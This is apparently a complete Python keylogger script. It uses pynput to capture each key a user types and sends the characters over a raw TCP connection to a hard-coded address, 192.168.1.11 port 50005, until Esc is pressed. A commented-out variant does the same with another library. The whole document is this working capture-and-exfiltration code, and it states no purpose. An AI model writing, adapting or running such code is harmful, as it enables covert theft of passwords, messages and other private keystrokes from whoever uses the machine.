#!/usr/bin/env python

from pynput.keyboard import Listener
from pynput import keyboard
import socket
#import keyboard

def onRelease(k):
    key = str(k).replace('\'', "")

    if k == keyboard.Key.esc:
        return False
    else:
        if k == keyboard.Key.space:
            key = ' '

        if not 'Key.' in key:
            s.send(key.encode())


tcpIP = '192.168.1.11'
tcpPort = 50005
BUFFER_SIZE = 1024
msg = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((tcpIP, tcpPort))

listener = Listener(on_release=onRelease)
listener.start()
listener.join()

'''while True:
    key = keyboard.read_key()
    if (key == "esc"):
        print("EXIT")
        break
    else:
        if (key == "space"):
            msg = " "
        else:
            msg = str(key)

        s.send(msg.encode())'''

s.close()
